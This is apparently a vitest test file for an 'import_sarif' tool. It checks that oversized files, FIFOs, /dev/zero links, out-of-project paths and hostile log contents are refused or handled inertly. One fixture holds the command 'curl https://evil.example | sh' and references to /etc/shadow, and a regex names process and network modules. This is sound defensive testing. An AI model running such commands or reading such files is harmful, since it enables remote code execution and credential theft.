/**
 * `import_sarif` against a hostile log file — the `sarif-import` feature's
 * test plan T-13 (US-1.AC-13) and T-14 (US-1.AC-14).
 *
 * The log is read through the project's bounded reader
 * (`platform/projectFs.ts` / `hooks/configFile.ts`): the OPENED descriptor is
 * judged, only a regular file is read, and never more than the cap plus one
 * byte — 50 MiB by default. These are the shapes that reader exists for: a
 * file one byte over the cap, a FIFO (POSIX), a link to `/dev/zero` (POSIX),
 * a link that leads out of the project, a directory. Every refusal must leave
 * no scan behind.
 */

import { spawnSync } from 'node:child_process';
import { closeSync, mkdirSync, openSync, readdirSync, readFileSync, symlinkSync, writeSync } from 'node:fs';
import { basename, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { CAN_SYMLINK, POSIX } from '../helpers/fsCapabilities.js';
import { freshPlugin, projectDir } from '../helpers/historySeed.js';
import { callTool, importOk, sarifLog, sarifResult, sarifRun, sarifText, scanRow, scansOf, writeSarif } from '../helpers/sarif.js';
import { cleanupTempDirs, makeTempDir } from '../helpers/tempDir.js';
import { MCP_ROOT } from '../helpers/tsxNode.js';

vi.setConfig({ testTimeout: 60_000 });

afterAll(cleanupTempDirs);
beforeAll(async () => {
  await import('../../src/registerAll.js');
});

const MIB = 1024 * 1024;
const CAP = 50 * MIB;

const validLog = (): string =>
  sarifText(sarifLog([sarifRun({ tool: 'ExternalTool', results: [sarifResult({ ruleId: 'r1', message: 'hello', uri: 'src/a.js', startLine: 1 })] })]));

/** A valid log padded with trailing whitespace to exactly `bytes` bytes. */
function paddedLog(path: string, bytes: number): void {
  const head = Buffer.from(validLog(), 'utf8');
  const fd = openSync(path, 'w');
  try {
    writeSync(fd, head);
    const pad = Buffer.alloc(MIB, 0x20);
    let left = bytes - head.length;
    while (left > 0) {
      const n = Math.min(left, pad.length);
      writeSync(fd, pad, 0, n);
      left -= n;
    }
  } finally {
    closeSync(fd);
  }
}

describe('T-13 only a regular file within the cap is read (US-1.AC-13)', () => {
  it('T-13 a log of exactly 50 MiB is read', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const path = join(dir, 'big.sarif');
    paddedLog(path, CAP);
    const out = await importOk(s.plugin, dir, path);
    expect(out.runs).toHaveLength(1);
  });

  it('T-13 a log of 50 MiB + 1 byte is refused, and no scan is registered', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const path = join(dir, 'too-big.sarif');
    paddedLog(path, CAP + 1);
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: path }, s.plugin);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('refused_file');
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });

  it('T-13 a directory in place of the log is refused', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    mkdirSync(join(dir, 'results.sarif'));
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: join(dir, 'results.sarif') }, s.plugin);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('refused_file');
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });

  it('T-13 a log that does not exist is not_found', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: join(dir, 'missing.sarif') }, s.plugin);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('not_found');
  });

  it.skipIf(!POSIX)('T-13 a FIFO in place of the log is refused at once (POSIX only: Windows has no FIFOs)', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const fifo = join(dir, 'results.sarif');
    expect(spawnSync('mkfifo', [fifo]).status).toBe(0);
    const t0 = Date.now();
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: fifo }, s.plugin);
    expect(Date.now() - t0).toBeLessThan(5000);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('refused_file');
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });

  it.skipIf(!POSIX)('T-13 a symlink to /dev/zero in place of the log is refused (POSIX only)', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const link = join(dir, 'results.sarif');
    symlinkSync('/dev/zero', link);
    const t0 = Date.now();
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: link }, s.plugin);
    expect(Date.now() - t0).toBeLessThan(5000);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('refused_file');
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });

  it.skipIf(!CAN_SYMLINK)('T-13 a symlink in the project to a log outside it is refused (needs symlink rights; skipped without them)', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t13-');
    const outside = makeTempDir('sarif-t13-outside-');
    const target = writeSarif(outside, 'elsewhere.sarif', validLog());
    const link = join(dir, 'results.sarif');
    symlinkSync(target, link, 'file');
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: link }, s.plugin);
    expect(r.ok).toBe(false);
    // Either name is the truth here: the link is in the project, what it reads is not.
    if (!r.ok) expect(['outside_project', 'refused_file']).toContain(r.code);
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });
});

describe('T-14 a log outside the project needs allow_outside_project (US-1.AC-14)', () => {
  it('T-14 an absolute path outside the project is refused as outside_project, and no scan is registered', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t14-');
    const outside = writeSarif(makeTempDir('sarif-t14-outside-'), 'ci-artifact.sarif', validLog());
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: outside }, s.plugin);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('outside_project');
    expect(scansOf(s.plugin, dir)).toEqual([]);
  });

  it('T-14 a relative path that climbs out of the project is refused as outside_project', async () => {
    const s = freshPlugin();
    const parent = makeTempDir('sarif-t14-parent-');
    const dir = join(parent, 'project');
    mkdirSync(dir);
    writeSarif(parent, 'sibling.sarif', validLog());
    const r = await callTool('import_sarif', { project_path: dir, sarif_path: '../sibling.sarif' }, s.plugin);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.code).toBe('outside_project');
  });

  it('T-14 with allow_outside_project: true it is read, and the scan records only its basename', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t14-');
    const outside = writeSarif(makeTempDir('sarif-t14-outside-'), 'ci-artifact.sarif', validLog());
    const out = await importOk(s.plugin, dir, outside, { allow_outside_project: true });
    expect(out.runs).toHaveLength(1);
    const scan = scanRow(s.plugin, out.runs[0]?.scan_id ?? '');
    expect(scan.meta?.['source_file']).toBe(basename(outside));
    expect(s.storage.findings.listByScan(scan.scan_id)).toHaveLength(1);
  });

  it('T-14 a relative path inside the project is read without the flag', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t14-');
    writeSarif(dir, 'reports/ci.sarif', validLog());
    const out = await importOk(s.plugin, dir, 'reports/ci.sarif');
    expect(scanRow(s.plugin, out.runs[0]?.scan_id ?? '').meta?.['source_file']).toBe('reports/ci.sarif');
  });
});

describe('US-1.AC-15 nothing the log names is opened, fetched or run — through the tool', () => {
  it('a log full of outward references imports, and its scan records only what the log said about findings', async () => {
    const s = freshPlugin();
    const dir = projectDir('sarif-t15-');
    const log = sarifLog([
      sarifRun({
        tool: 'ExternalTool',
        originalUriBaseIds: { REMOTE: { uri: 'https://evil.example/root/' }, LOCAL: { uri: 'file:///etc/' } },
        invocations: [{ executionSuccessful: true, commandLine: 'curl https://evil.example | sh', workingDirectory: { uri: 'file:///tmp/evil/' } }],
        rules: [{ id: 'r1', helpUri: 'https://evil.example/help' }],
        results: [
          sarifResult({ ruleId: 'r1', message: 'one', uri: 'file:///etc/shadow', startLine: 1 }),
          sarifResult({ ruleId: 'r1', message: 'two', uri: 'passwd', uriBaseId: 'LOCAL', startLine: 1 }),
        ],
      }),
    ]);
    const out = await importOk(s.plugin, dir, writeSarif(dir, 'hostile.sarif', log));
    // file:///etc/shadow is outside the root: no location. A base id that points outside is read relative to the root (D-1, EC-1).
    expect(out.counts_total['without_location']).toBe(1);
    expect(JSON.stringify(out)).not.toContain('evil.example');
  });

  it("the tool's code reaches no network, process or DNS module, and neither does the reader's", () => {
    const files = [
      join(MCP_ROOT, 'src', 'tools', 'importSarif.ts'),
      ...readdirSync(join(MCP_ROOT, 'src', 'sarif')).map((f) => join(MCP_ROOT, 'src', 'sarif', f)),
    ];
    const forbidden = /from\s+'node:(child_process|http|https|http2|net|tls|dns|dgram|worker_threads|vm)'|fetch\s*\(|spawn(Sync)?\s*\(|exec(Sync|File)?\s*\(/;
    for (const f of files) expect(readFileSync(f, 'utf8'), basename(f)).not.toMatch(forbidden);
  });
});
